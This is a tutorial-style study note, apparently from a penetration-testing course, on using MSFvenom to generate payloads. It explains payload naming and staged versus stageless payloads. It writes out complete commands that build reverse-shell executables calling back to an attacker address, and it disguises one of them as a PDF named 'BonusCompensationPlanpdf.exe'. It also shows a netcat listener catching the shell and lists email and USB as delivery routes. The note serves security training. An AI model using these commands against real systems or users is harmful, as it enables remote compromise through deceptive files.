# 💣 Payloads — Automating Creation & Delivery with MSFvenom

🎯 **Core Idea**

`MSFvenom` is a Metasploit utility used to **generate payloads** for different operating systems, architectures, and communication methods.

```text
                 🛠️ MSFvenom
                     │
          ┌──────────┴──────────┐
          ▼                     ▼
     🎯 Select Payload       ⚙️ Configure
          │                  LHOST / LPORT
          ▼                     │
     🖥️ OS / Arch               │
          │                     │
          └──────────┬──────────┘
                     ▼
              📦 Generated File
                     │
                     ▼
               🎯 Target System
```

🧠 **Big Picture**

Unlike using a Metasploit exploit module directly against a reachable target, `MSFvenom` allows us to **create a payload as a file**, which can then be delivered through different mechanisms.

---

# 1️⃣ Why Use MSFvenom?

When the target cannot be reached directly over the network, we may need another way to deliver the payload.

Possible delivery methods include:

- 📧 Email attachment
    
- 🌐 Download link
    
- 💾 USB / physical media
    
- 🛠️ Combined with an exploit
    
- 📂 Other file-transfer mechanisms
    

```text
🚫 No Direct Network Access
          │
          ▼
      📦 Create Payload
          │
          ▼
    📧 / 🌐 / 💾 Delivery
          │
          ▼
       🎯 Target
          │
          ▼
      ▶️ Execution
          │
          ▼
       💻 Shell
```

⚠️ **Important**

Payload creation and payload delivery are separate concepts.

```text
🛠️ MSFvenom
     │
     ▼
📦 Create Payload
     │
     ▼
🚚 Deliver Payload
     │
     ▼
▶️ Execute Payload
     │
     ▼
🔗 Establish Connection
```

---

# 2️⃣ What Is MSFvenom?

`MSFvenom` is a Metasploit component used to **craft payloads**.

It allows us to specify things such as:

- 🖥️ Target operating system
    
- 🏗️ Architecture
    
- 🔗 Connection type
    
- 🌐 LHOST
    
- 🔌 LPORT
    
- 📦 Output format
    
- 🔐 Encoding / transformation options
    

Basic structure:

```text
msfvenom
   │
   ├── -p → Payload
   │
   ├── LHOST → Callback address
   │
   ├── LPORT → Callback port
   │
   └── -f → Output format
```

---

# 3️⃣ Listing Available Payloads

To view available payloads:

```bash
msfvenom -l payloads
```

This produces a large list of available payloads.

Example:

```text
linux/x86/shell/reverse_tcp
linux/zarch/meterpreter_reverse_tcp

windows/dllinject/reverse_tcp
windows/dllinject/reverse_http

multi/meterpreter/reverse_http
multi/meterpreter/reverse_https
```

🧠 **Notice the naming convention.**

Payload names often tell us important information about what the payload does.

```text
linux/x86/shell/reverse_tcp
│     │   │     │
│     │   │     └── Communication
│     │   └──────── Shell
│     └──────────── Architecture
└────────────────── Platform
```

---

# 4️⃣ Understanding Payload Names

A payload name can encode several pieces of information.

### Example

```text
linux/x64/shell_reverse_tcp
```

Breakdown:

```text
linux
  │
  └── 🐧 Target platform

x64
  │
  └── 🏗️ 64-bit architecture

shell
  │
  └── 💻 Command shell

reverse_tcp
  │
  └── 🔗 Reverse TCP connection
```

Another example:

```text
windows/meterpreter/reverse_tcp
```

```text
windows
    │
    └── 🪟 Target platform

meterpreter
    │
    └── 🧰 Meterpreter payload

reverse_tcp
    │
    └── 🔗 Reverse TCP communication
```

---

# 5️⃣ Staged vs Stageless Payloads

One of the most important concepts when working with Metasploit payloads is the difference between **staged** and **stageless** payloads.

---

## 🪜 Staged Payload

A **staged payload** is delivered in multiple parts.

```text
🎯 Target
   │
   ▼
📦 Small Initial Stage
   │
   ▼
🔗 Callback
   │
   ▼
📥 Retrieve Remaining Payload
   │
   ▼
💻 Shell / Session
```

Think of it as:

> **Stage 1 → establish communication → receive the rest**

Example:

```text
linux/x86/shell/reverse_tcp
```

The payload is divided into stages.

### Advantages

- 📦 Smaller initial payload
    
- 🚚 Can be useful when payload size matters
    
- 🧩 Allows additional components to be delivered after the initial stage
    

### Disadvantages

- 🌐 Requires additional network communication
    
- 📡 More traffic is generated
    
- ⚠️ Can be less reliable on high-latency or restricted networks
    

---

# 6️⃣ Stageless Payload

A **stageless payload** contains the required payload in one package.

```text
🎯 Target
   │
   ▼
📦 Complete Payload
   │
   ▼
▶️ Execute
   │
   ▼
🔗 Establish Connection
   │
   ▼
💻 Shell / Session
```

Example:

```text
linux/x64/shell_reverse_tcp
```

The payload does not need to retrieve another stage.

### Advantages

- 📦 Everything is contained in one payload
    
- 🌐 Less additional staging traffic
    
- ⚡ Can be useful where latency or bandwidth is a concern
    

### Disadvantages

- 📦 Payload can be larger
    
- 💾 More code may need to be delivered at once
    

---

# 7️⃣ 🧠 How to Recognize Staged vs Stageless

Payload naming gives us a useful clue.

### Staged

```text
windows/meterpreter/reverse_tcp
```

Notice the separate components:

```text
windows
   ↓
meterpreter
   ↓
reverse_tcp
```

This represents a **staged** payload.

### Stageless

```text
windows/meterpreter_reverse_tcp
```

Here the payload and communication method are combined:

```text
windows
   ↓
meterpreter_reverse_tcp
```

This represents a **stageless** payload.

### Quick Memory Trick

```text
🪜 STAGED

windows/meterpreter/reverse_tcp
        ↓        ↓
      stage    stage


📦 STAGELESS

windows/meterpreter_reverse_tcp
        ↓
   single payload
```

⚠️ The payload description can also explicitly tell you whether a payload is staged or stageless.

---

# 8️⃣ Building a Stageless Linux Payload

Example:

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
LHOST=10.10.14.113 \
LPORT=443 \
-f elf > createbackup.elf
```

The command can be broken down into several parts.

---

## 🛠️ Calling MSFvenom

```bash
msfvenom
```

Starts the MSFvenom utility.

---

## 📦 Selecting a Payload

```bash
-p
```

Specifies that we are selecting a payload.

```bash
-p linux/x64/shell_reverse_tcp
```

---

## 🐧 Selecting the Payload

```text
linux/x64/shell_reverse_tcp
```

Means:

```text
Linux
  ↓
64-bit
  ↓
Shell
  ↓
Reverse TCP
```

So this is a **Linux x64 stageless reverse TCP shell payload**.

---

# 9️⃣ LHOST & LPORT

```bash
LHOST=10.10.14.113
LPORT=443
```

These define where the payload will attempt to connect back.

```text
Target
  │
  │ Reverse connection
  ▼
LHOST: LPORT
```

### LHOST

```text
LHOST
  ↓
Listen / callback address
```

The target uses this address to determine **where to connect back**.

### LPORT

```text
LPORT
  ↓
Listen / callback port
```

The target uses this port when establishing the connection.

🧠 **Remember**

```text
LHOST → WHERE
LPORT → WHICH PORT
```

---

# 🔟 Output Format

```bash
-f elf
```

The `-f` option specifies the output format.

```text
-f elf
   │
   ▼
📦 ELF executable
```

`ELF` is a common executable format on Linux systems.

---

# 1️⃣1️⃣ Output Filename

```bash
> createbackup.elf
```

The shell redirects the generated output into:

```text
createbackup.elf
```

So the complete flow is:

```text
🛠️ MSFvenom
     │
     ▼
📦 Linux x64 reverse shell
     │
     ├── LHOST
     ├── LPORT
     └── ELF format
     │
     ▼
createbackup.elf
```

---

# 1️⃣2️⃣ Complete Command Breakdown

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
LHOST=10.10.14.113 \
LPORT=443 \
-f elf > createbackup.elf
```

|Part|Meaning|
|---|---|
|`msfvenom`|🛠️ Payload-generation tool|
|`-p`|📦 Select payload|
|`linux/x64/shell_reverse_tcp`|🐧 Linux x64 stageless reverse TCP shell|
|`LHOST`|🌐 Callback address|
|`LPORT`|🔌 Callback port|
|`-f elf`|📦 Generate ELF format|
|`> createbackup.elf`|💾 Save output as an ELF file|

---

# 1️⃣3️⃣ Delivering the Payload

Creating the payload is only one part of the process.

```text
🛠️ Create
   │
   ▼
📦 Payload
   │
   ▼
🚚 Delivery
   │
   ├── 📧 Email
   ├── 🌐 Website / Download
   ├── 🛠️ Exploit
   └── 💾 Physical Media
   │
   ▼
🎯 Target
   │
   ▼
▶️ Execution
```

The target must receive **and execute** the payload before the intended connection can be established.

---

# 1️⃣4️⃣ Catching the Connection

A listener can be prepared on the receiving system.

Example:

```bash
sudo nc -lvnp 443
```

Conceptually:

```text
🎯 Target
   │
   │ Reverse TCP
   ▼
🖥️ Listener
   │
   ▼
💻 Shell
```

Example successful connection:

```text
Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
```

At this point, commands can be issued through the established shell.

---

# 🪟 1️⃣5️⃣ Windows Payloads

MSFvenom can also generate payloads for Windows.

Example:

```bash
msfvenom -p windows/shell_reverse_tcp \
LHOST=10.10.14.113 \
LPORT=443 \
-f exe > BonusCompensationPlanpdf.exe
```

The important differences are:

```text
Linux:
linux/x64/shell_reverse_tcp
        │
        ▼
      -f elf


Windows:
windows/shell_reverse_tcp
        │
        ▼
      -f exe
```

### Breakdown

```text
windows
   │
   └── 🪟 Target OS

shell_reverse_tcp
   │
   └── 💻 Stageless reverse TCP shell

LHOST
   │
   └── 🌐 Callback address

LPORT
   │
   └── 🔌 Callback port

-f exe
   │
   └── 📦 Windows executable format
```

---

# 1️⃣6️⃣ Payload Execution on Windows

The general process is the same:

```text
🛠️ MSFvenom
     │
     ▼
📦 Windows executable
     │
     ▼
🚚 Deliver to target
     │
     ▼
▶️ Execute
     │
     ▼
🔗 Reverse connection
     │
     ▼
🖥️ Listener
```

⚠️ **Defensive Note**

A raw MSFvenom payload may be detected by antivirus or endpoint security.

This is an important lesson:

```text
📦 Payload
   │
   ▼
🛡️ AV / EDR
   │
   ├── 🔎 Static analysis
   ├── 🔎 Behavioral analysis
   └── 🔎 Network activity
```

The payload's ability to execute therefore depends not only on whether the file reaches the target, but also on the security controls present on that system.

---

# 1️⃣7️⃣ Payload Delivery vs Payload Execution

These are two separate stages.

### Delivery

```text
📦 Payload
   │
   ▼
🚚 Transfer
   │
   ▼
🎯 Target
```

### Execution

```text
🎯 Target
   │
   ▼
▶️ Execute Payload
   │
   ▼
🔗 Connection
```

A successful transfer **does not automatically mean successful execution**.

---

# 🧠 1️⃣8️⃣ Payloads Depend on the Target

The payload must match the target environment.

Important factors include:

```text
🎯 Target
   │
   ├── 🖥️ Operating System
   │
   ├── 🏗️ Architecture
   │
   ├── 🐚 Available Shell
   │
   ├── 🌐 Network Connectivity
   │
   └── 🛡️ Security Controls
```

For example:

```text
🐧 Linux x64
      ↓
linux/x64/...


🪟 Windows
      ↓
windows/...
```

Choosing the wrong platform or architecture can prevent the payload from functioning.

---

# 1️⃣9️⃣ Automated Payloads vs Manual Payloads

Not every payload is manually written as a one-liner.

There are two broad approaches:

```text
Payload Creation
      │
 ┌────┴─────────────┐
 ▼                  ▼
📝 Manual         🤖 Automated
Commands          Frameworks
 │                  │
 ▼                  ▼
One-liners       Metasploit
                 MSFvenom
```

### Manual

You construct the commands yourself.

Example concepts:

```text
TCP connection
   +
Shell
   +
Input/output
   +
Encoding
```

### Automated

Frameworks such as Metasploit can automate much of this process.

```text
🎯 Target
   │
   ▼
🛠️ Metasploit
   │
   ├── Exploit
   ├── Payload
   └── Delivery
   │
   ▼
💻 Session
```

---

# 🔎 2️⃣0️⃣ MSFvenom vs Metasploit Modules

These tools are related but serve different purposes.

|🛠️ Tool|🎯 Main Purpose|
|---|---|
|**Metasploit Framework**|Exploitation, scanning, payload delivery, sessions|
|**MSFvenom**|Generate and customize payload files|
|**Meterpreter**|Interactive payload/session environment|
|**Netcat**|Simple network listener / connection utility|

🧠 Think of it like:

```text
🛠️ Metasploit
      │
      ├── 🎯 Exploit
      │
      ├── 📦 Payload
      │
      └── 💻 Session


🛠️ MSFvenom
      │
      └── 📦 Generate Payload
```

---

# ⚡ 2️⃣1️⃣ Quick Reference

### MSFvenom Basics

```text
msfvenom
   ↓
Generate payload
```

```text
-p
   ↓
Select payload
```

```text
LHOST
   ↓
Callback address
```

```text
LPORT
   ↓
Callback port
```

```text
-f
   ↓
Output format
```

---

### Common Formats

```text
ELF
 ↓
🐧 Linux executable

EXE
 ↓
🪟 Windows executable
```

---

### Staged vs Stageless

```text
🪜 STAGED
windows/meterpreter/reverse_tcp
        ↓
Multiple stages


📦 STAGELESS
windows/meterpreter_reverse_tcp
        ↓
Single payload
```

---

# 🎯 2️⃣2️⃣ Final Takeaways

**1. MSFvenom** 🛠️  
Used to generate payloads in different formats for different platforms.

**2. Payload names contain useful information** 🧠  
They can reveal the platform, architecture, shell, and communication method.

**3. Staged payloads** 🪜  
Use an initial stage and retrieve additional components.

**4. Stageless payloads** 📦  
Contain the payload without requiring a separate stage.

**5. LHOST** 🌐  
Defines the callback/listening address.

**6. LPORT** 🔌  
Defines the callback/listening port.

**7. `-f`** 📦  
Defines the output format.

**8. Delivery ≠ Execution** 🚚  
Getting a payload onto a system does not mean it successfully executed.

**9. Payloads must match the target** 🎯  
OS, architecture, networking, shell environment, and security controls all matter.

**10. Metasploit automates the workflow** 🤖  
MSFvenom focuses specifically on creating payloads, while the broader Metasploit Framework provides exploitation, delivery, and session-management capabilities.

---

# 🧩 BIG PICTURE

```text
                    🛠️ MSFvenom
                         │
                         ▼
                  📦 Select Payload
                         │
             ┌───────────┴───────────┐
             ▼                       ▼
         🖥️ Platform             🏗️ Architecture
             │                       │
             └───────────┬───────────┘
                         ▼
                  🌐 LHOST / LPORT
                         │
                         ▼
                    📦 Format
                         │
                         ▼
                  💾 Payload File
                         │
                         ▼
                     🚚 Delivery
                         │
                         ▼
                    🎯 Target
                         │
                         ▼
                     ▶️ Execute
                         │
                         ▼
                    🛡️ Security
                    Controls
                         │
                         ▼
                  🔗 Connection
                         │
                         ▼
                    💻 Session
```

💡 **Big Picture:**  
`MSFvenom` gives us a way to **craft a payload separately from the exploitation process**. The most important concepts to understand are **payload naming, staged vs. stageless payloads, LHOST/LPORT, output formats, delivery, and execution**. These concepts form the foundation for understanding how Metasploit payloads work.